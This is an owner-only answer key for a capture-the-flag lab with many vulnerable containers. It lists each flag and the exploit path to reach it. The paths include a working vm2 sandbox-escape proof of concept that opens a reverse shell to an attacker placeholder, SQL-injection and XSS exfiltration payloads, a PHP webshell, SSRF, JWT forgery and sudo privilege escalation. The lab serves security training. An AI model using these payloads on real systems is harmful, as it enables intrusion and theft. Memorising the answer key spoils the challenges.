# FLAGS.md (Owner-only reference)

Do **not** distribute this file to players. It lists every flag and
exactly where it lives so you can verify a deployment or re-flag the
machine.

---

### 1. FTP flag
- **Location:** FTP container, `/home/ftpsvc/flag.txt` (reachable only through the simulated vsFTPd 2.3.4 backdoor shell, which dials a reverse shell back to whoever sent the trigger, never via the FTP protocol itself)
- **Content:** `CTF{4LW4YS_CH3CK_0LD_CV3S_B3F0R3_M0V1NG_0N}`
- (Decoy file `fake_flag.txt` is served anonymously over FTP and contains `Nice try — this is a decoy, not the real flag.`)

### 2. Port 80 command injection flag
- **Location:** `web80-command-injection` container, `/app/files/flag1.txt`
- **Content:** `CTF{Diiiiiiiiir_m3Ak_Foll0w_AS4Hb1_aramon_it}`
- (Decoy files in the same directory: `secret.txt` contains `Some commands may be blacklisted.`; plus 10 more fake "leaked company file" decoys — `employee_directory.txt`, `payroll_summary_q3.txt`, `client_contacts.txt`, `server_inventory.txt`, `vpn_access_list.txt`, `network_notes.txt`, `hr_policy_draft.txt`, `finance_budget_2025.txt`, `it_helpdesk_tickets.txt`, `project_roadmap.txt` — none contain a flag; they exist purely so `ls` sells the "impact" of the command injection as reaching real company data.)

### 3. Port 3000 login flag
- **Location:** `dashboard3000-ssti` container, rendered on `/dashboard` as `flag0.txt`
- **Content:** `CTF{WelCome_t0_TH2_CTF_lets_G000_4_THe_NEXT!!}`

### 4. Port 3000 SSTI credential file
- **Location:** `dashboard3000-ssti` container, `/opt/creds.txt` (reachable via SSTI RCE on the `/welcome` endpoint)
- **Content:**
  ```
  user : chakir
  password : H4RD_P4SS_BR0_20262026
  ```

### 5. SSH user flag
- **Location:** `ssh2222-privesc` container, `/home/chakir/flag4.txt`
- **Content:** `CTF{GR34T_W0RK_Y0U_F0UND_TH3_US3R_FL4G}`
- (`/home/chakir/note.txt` points the player at `/root` for the next flag)

### 6. SSH root flag
- **Location:** `ssh2222-privesc` container, `/root/flag5.txt`
- **Content:** `CTF{R00T_W4S_N0T_T00_H4RD_BUT_R3QU1R3D_TH1NK1NG}`
- Reached via the intentional `sudo -l` -> `/usr/bin/find` GTFOBins misconfiguration (`chakir ALL=(ALL) NOPASSWD: /usr/bin/find`).

### 7. SMB flag
- **Location:** `smb445` container, `Secret` share, `flag3.txt`
- **Content:** `CTF{GR34T_J0B_Y0U_4R3_0N_TH3_R1GHT_P4TH}`
- SMB credentials: `Adam` / `password123` (intentionally weak/brute-forceable).
- `Public` share is anonymous and contains `welcome.txt` (base64-encoded text, mostly filler/"keep going" flavor text) and `it_notice.txt` (hex-encoded text that decodes to: "Adam, do not forget: I left an important file for you in the folder named Secret.") which together point to the `Adam` username and the `Secret` share.

### 8. Apache Struts2 flag
- **Location:** `struts8888` container, `/flag2.txt`
- **Content:** `CTF{CVEs_1s_E4Sy_4_Y0u_By_R2v2rse_SH2LLLLL}`
- Reached via the CVE-2017-5638 style `Content-Type` header OGNL/RCE simulation.

### 9. Dev Panel localStorage flag
- **Location:** Browser `localStorage` key `devpanel_token`, set after a successful SQL-injection login on `devpanel8000-sqli`
- **Encoded (exact value stored, as specified):** `RkxBRzEgOiBDVEZ7NExXNFlTXzFOU1AzQ1RfRDNWVDAwTFNfQzRSM0ZVTExZfQ==`
- **Decoded (ground truth - verified with `base64 -d`):** `FLAG1 : CTF{4LW4YS_1NSP3CT_D3VT00LS_C4R3FULLY}`
  - Note: this is the literal, byte-for-byte decode of the encoded token above. Use this exact value as the answer key — it is the authoritative flag because the encoded token is what is actually delivered to players.
- SQLi login bypass example: username `' OR '1'='1' -- -`, any password.
- Backend user used to demonstrate the bypass: `hamza` / `hamza@technoIT.local` (real password is random/unknown by design - the bypass never needs it).

### 10. LFI flag (bonus)
- **Location:** `lfi9999` container, `/var/www/flag6.txt` (outside the web root `/var/www/html`, reachable via path traversal, e.g. `?file=../flag6.txt`)
- **Content:** `CTF{LF1_1S_N0T_0NLY_P4SSWD_1NSP3CT_F1L3S_C4R3FULLY}`

### 11. JBoss HR Portal RCE flag
- **Location:** `rh-jboss` container, `/opt/hr-app/flag7.txt`
- **Content:** `CTF{JB0SS_Expl01t_Succ2ss_N1Ce_1}`
- Real (unmodified) `vulhub/jboss:as-4.0.5` under the themed HR portal,
  with the `jmx-console` app's BASIC-auth constraint stripped so
  `/jmx-console` and `/jmx-console/HtmlAdaptor` need no credentials.
  Intended path: `exploit/multi/http/jboss_deploymentfilerepository`
  (`TARGETURI /jmx-console`, `TARGET 0` or `3`, Java-compatible
  payload required, e.g. `java/shell_reverse_tcp`). The
  unauthenticated `/invoker/JMXInvokerServlet` and
  `/invoker/EJBInvokerServlet` remain open as a fallback, exploitable
  with `jboss_invoke_deploy`, `jboss_maindeployer`, or
  `jboss_bshdeployer`.
- `/opt/hr-app/notes.txt` points the player at `/etc/hosts`, which
  contains `172.30.80.50 internal-api.blueoffice.local` /
  `internal-api` — the next pivot target, reachable only from inside
  this container's `pivotnet` network (e.g. via ligolo-ng).

### 12. Internal HR API SSRF flag
- **Location:** `internal-api` container, `/app/flag8.txt`, served over HTTP only on `127.0.0.1:3000/flag8.txt` **inside** that same container (never published anywhere)
- **Content:** `CTF{SSRF_VULN_1NT3RN4L_4P1_0WN3D}`
- Reached via the SSRF bug in `internal-api`'s `GET /api/files?name=` (port 5000, only reachable from `pivotnet` after pivoting through `rh-jboss`): `name=127.0.0.1:3000/flag8.txt` makes the API fetch that URL instead of reading a local file.
- `GET /api/files?name=readme.txt` is the in-fiction hint that lists `127.0.0.1:3000` as a known internal peer service.

### 13. FST School Portal — access control bypass (flag10)
- **Location:** `fst-school` container, `/admin` route
- **Content:** `CTF{ACce55_Contr01_ByPa55_PFFFFFFFFFF}`
- `/admin` trusts the client-supplied `X-Forwarded-For` header. Normal requests get `403`; sending `X-Forwarded-For: 127.0.0.1` or `X-Forwarded-For: localhost` returns the flag.

### 14. Next.js middleware bypass (flag11)
- **Location:** `next-middleware-cve` container, `/flag` route (Next.js 15.2.2, CVE-2025-29927 style)
- **Content:** `CTF{NeXT_JS_M1DDLEW4RE_BYpA55_CVE_2025_29927}`
- `/flag` is gated only in `middleware.ts`. Normal requests get `403`. Sending header `x-middleware-subrequest: middleware` makes the middleware skip its own auth check and serve the page.

### 15. FST School Portal — SQL injection database dump (flag12)
- **Location:** `fst-school` container, SQLite DB `/app/data/FST.db` (logical DB name `FST`, tables `students` and `profs`), reached via SQLi on `/login`'s username/email field
- **Content:** `CTF{My_password}` — this is the literal `password` column value for the `students` row where `username = 'anas'` / `email = 'anas@fst.local'`.
- Injection point: the `username` form field is concatenated directly into `SELECT * FROM students WHERE username = '<x>' OR email = '<x>' AND password = '<y>'`. Example auth-bypass payload: `username=nonexistent' OR '1'='1' -- ` (any password). Verified end-to-end: `sqlmap -u http://<host>:9005/login --data "username=test&password=test" -p username --batch --level=5 --risk=3 --dbms=sqlite -D SQLite_masterdb -T students --dump` detects it as OR boolean-based blind and dumps all 10 rows, including Anas's `CTF{My_password}`.
- The landing page (`/`) has an HTML source comment (in English, translated from the owner's original Darija note) pointing at Anas's password being flag12 in `CTF{...}` format — this is flavor/flagging text for the owner, not required to solve the SQLi itself.

### 16. Weak JWT HS256 secret (flag13)
- **Location:** `jwt-weak-secret` container, `/admin` route
- **Content:** `CTF{WeAK_JWT_PA55_ByP4SS}`
- JWTs are signed HS256 with the weak secret `Nabil2027@`. `/register` or `/login` issues a token with `role: user`; forging a token with the same secret and `role: admin` (e.g. via `pyjwt`) and sending it as `Authorization: Bearer <token>` (or the `token` cookie) to `/admin` returns the flag.
- The landing page has an HTML source comment describing the weak-secret pattern (name + four digits + one symbol) without stating the secret outright.

### 17. IDOR user profile enumeration (flag14)
- **Location:** `idor-clock` container, `/profile?id=20` (also `/?id=20`)
- **Content:** `CTF{1D0R_ByPaSS_SuccEeSS!!!!!!}`
- No authentication anywhere on this service by design. `/db` lists MD5 hashes for 20 fake user passwords; `/profile?id=<n>` (1-20) returns that user's profile with no ownership check. User 20's `description` field contains the flag.

### 18. Cloud metadata SSRF (flag15)
- **Location:** `cloud-metadata-ssrf` container, `/opc/v2/instance/` route
- **Content:** `CTF{SSRF_TO_TH3_CL0UD_M3T4D4T4_OWN3D}`
- The landing page's "report preview" feature (`POST /` with an `url` field) fetches any `http(s)://` URL server-side with no host restriction. The instance-metadata route only answers requests whose `remote_addr` is `127.0.0.1` (i.e. only reachable through the app's own SSRF, never directly from outside — direct requests get `403`). Payload: `url=http://127.0.0.1:5000/opc/v2/instance/`. The metadata JSON's `metadata.flag` field contains flag15. Verified working end-to-end.

### 19. File upload extension bypass RCE (flag16)
- **Location:** `file-upload-bypass` container, `/var/www/flag_upload.txt` (outside the upload directory), reached via a webshell placed at `/uploads/<name>`
- **Content:** `CTF{UPL0AD_BYP4SS_W3BSH3LL_RCE}`
- `upload.php`'s "JPG/PNG only" check (`stripos($filename, $ext) !== false`) only checks that an allowed extension appears *somewhere* in the filename, not that it's the real final extension. A file named e.g. `shell.jpg.php` passes the check (contains `.jpg`) while Apache executes it as PHP (real final extension `.php`). Shell payload: `<?php system($_GET['cmd']); ?>`. Verified end-to-end: upload `shell.jpg.php`, then `GET /uploads/shell.jpg.php?cmd=cat+/var/www/flag_upload.txt` returns flag16.

### 20. PostgreSQL weak credentials (flag17)
- **Location:** `postgres5432-weak-creds` container, `flags` database, `users` table, `internal_note` column of the `legacy_admin` row
- **Content:** `CTF{Alw4y5_cHeK_TH2_D2FaulT_P4ss}`
- PostgreSQL is published directly on `5432:5432` with `POSTGRES_USER=postgres` / `POSTGRES_PASSWORD=postgres` / `POSTGRES_DB=blueoffice`, and the official image's default `pg_hba.conf` already allows password auth from any host (no config override needed) so `psql -h <TARGET_IP> -p 5432 -U postgres -d blueoffice` (password `postgres`) succeeds unmodified.
- `\l` shows a second database, `flags`, seeded alongside the realistic `blueoffice` corporate schema (`clients`, `employees`, `departments`, `deals`, `invoices`, `projects`, `users`). `flags.users` holds several believable service accounts (`backup_service`, `audit_reader`, `hr_sync`, `reporting_bot`, `svc_monitoring`, `db_replication`, `etl_pipeline`, `vendor_integration`); the flag is hidden inside `legacy_admin`'s `internal_note`, phrased as a migration/audit note about a never-rotated bootstrap password. The flag is not the username, not in any table named for flags, not in `docker-compose.yml`, not in an env var, and never printed to the container's startup logs - it only ever exists inside the seeded row.
- Seed data lives in `services/postgres5432-weak-creds/postgres-init/01-blueoffice.sql` (blueoffice schema/data) and `02-flags.sql` (the `flags` database and the flag row), baked into the image at build time via Dockerfile `COPY` - no host bind-mount.

### 21. ReactoShell — mass assignment privesc + real vm2 CVE-2023-37466 RCE (flag18)
- **Location:** `reactoshell3001-vmescape` container, `/opt/aramoon/flag_reactoshell.txt` (owner-readable only, `chmod 400`)
- **Content:** `CTF{Re4cT_T0_5hE11_EXp10t4T10n_5uCc2ss}`
- "Aramoon" — a small multi-page student platform (`/`, `/programs`, `/ecosystem`, `/services`, `/institution` marketing pages; `/register`, `/login`, `/dashboard`, `/profile` behind a real cookie session). This is a genuine two-stage chain — there is no shortcut URL to guess; both stages must be exploited in order.
  1. **Privilege escalation via mass assignment.** `PATCH /api/profile` (the endpoint the profile-edit form on `/profile` calls) does `Object.assign(req.user, req.body)` with no field allowlist — the form only ever sends `{username, bio, github}`, but any other JSON field rides along unchecked. Register a normal account, then:
     ```bash
     curl -c cookies.txt -X POST http://<TARGET_IP>:3001/api/register \
       --data-urlencode "username=Player" --data-urlencode "email=p@example.com" --data-urlencode "password=hunter22"
     curl -b cookies.txt -X PATCH http://<TARGET_IP>:3001/api/profile \
       -H 'Content-Type: application/json' --data '{"role":"staff"}'
     ```
     `/dashboard` now shows a "Staff Tools" card linking to `/staff/tools/reactoshell`; both that page and its render API 403 for role `student`, so this step is mandatory, not optional.
  2. **Real RCE: CVE-2023-37466 (vm2 sandbox escape, CVSS 9.8).** `/staff/tools/reactoshell` is a "component preview" tool whose `POST .../api/render` runs the submitted `code` through the **real, unmodified `vm2` npm package pinned at 3.9.19** (the last version before the fix in 3.10.0) — not a hand-rolled sandbox. 3.9.19 is genuinely vulnerable to the disclosed "Promise `[Symbol.species]` handler sanitization bypass" (public PoC: https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9). The exact public PoC works unmodified against this box (verified end-to-end):
     ```js
     async function fn() {
         (function stack() { new Error().stack; stack(); })();
     }
     p = fn();
     p.constructor = {
         [Symbol.species]: class FakePromise {
             constructor(executor) {
                 executor(
                     (x) => x,
                     (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"'); }
                 )
             }
         }
     };
     p.then();
     ```
     Submitted as the `code` field of `POST /staff/tools/reactoshell/api/render` (with the `staff`-role session cookie from step 1), against an `nc -lvnp <PORT>` listener. Lands a reverse shell as `reactoapp` inside the container.
- In the shell: `cat /opt/aramoon/flag_reactoshell.txt`.
- `/opt/aramoon/README_INTERNAL.txt` is a post-exploitation flavor/confirmation note that names the exact CVE (only readable after RCE, so it's not a pre-solve spoiler); `/opt/aramoon/notes.txt` is an unrelated decoy note (a Nabil/JWT-secret-rotation easter egg, cross-referencing challenge 16's `jwt-weak-secret`).
- No naive keyword blacklist exists on the render endpoint in this version — the only barrier before the render API is the staff-role gate from step 1; the vm2 CVE itself is the entire "hard" part.

### 22. IT Helpdesk blind stored XSS -> admin session hijack (flag19)
- **Location:** `helpdesk6000-blind-xss` container, `/admin/flag`
- **Content:** `CTF{BL1ND_XSS_H1J4CK5_TH3_4DM1N_B0T_0F_AR4M0n}`
- Public ticket form (`POST /submit`) stores a ticket's `message` field verbatim. `/admin/tickets/<id>` (admin-only) renders it with Jinja2's `|safe` filter — the classic unescaped-render sink. A real headless-Chromium bot (`bot.py`), running in-process, cycles every ~20s: it logs into `/admin/login` with its own credentials (never exposed to players) and opens every open ticket, so injected JavaScript genuinely executes inside an authenticated admin browser session.
- The admin session cookie is a normal HttpOnly Flask session cookie — reading `document.cookie` is a dead end by design. The intended path is a same-origin authenticated `fetch()` from the stored payload (rides the admin's session regardless of HttpOnly) against `/admin/flag`, exfiltrated to the app's own built-in mini-collector (`/collector/new` -> `/collector/<token>/hit` -> `/collector/<token>/log`) so no outbound internet egress is ever required.
- Verified end-to-end payload (submitted as the ticket `message`, after creating a collector at `/collector/new`):
  ```html
  <script>fetch('/admin/flag',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('/collector/<TOKEN>/hit?flag='+encodeURIComponent(t)))</script>
  ```
  Within one bot cycle (~20-40s), `/collector/<TOKEN>/log` shows the exfiltrated `{"flag": "CTF{BL1ND_XSS_H1J4CK5_TH3_4DM1N_B0T_0F_AR4M0n}"}`.

### 23. Employee Kudos Wall blind stored XSS -> manager session hijack (flag20)
- **Location:** `kudoswall5050-blind-xss` container, `/manager/secret-notes`
- **Content:** `CTF{5T0R3D_XSS_1S_5T1LL_D4NG3R0U5_4_4R4M0N}`
- Second, independently-solvable variant of challenge 22's pattern, reskinned as an HR moderation queue instead of a support-ticket queue. Public kudos posts (`POST /post`) sit in a pending-moderation list; `/manager/queue/<id>` (manager-only) previews a kudos card's `message` with `|safe` (in-fiction excuse: kudos cards support emoji/GIF embeds). A headless-Chromium bot plays the HR manager: it logs into `/manager/login` with its own credentials every ~20s and opens every pending kudos card.
- Same exfil pattern as challenge 22: authenticated `fetch()` against `/manager/secret-notes`, exfiltrated to this app's own built-in mini-collector (`/collector/new` / `/collector/<token>/hit` / `/collector/<token>/log`), no outbound egress needed.
- Verified end-to-end payload (submitted as the kudos `message`):
  ```html
  <script>fetch('/manager/secret-notes',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('/collector/<TOKEN>/hit?flag='+encodeURIComponent(t)))</script>
  ```
  `/collector/<TOKEN>/log` shows the exfiltrated `{"flag": "CTF{5T0R3D_XSS_1S_5T1LL_D4NG3R0U5_4_4R4M0N}"}` within one bot cycle.
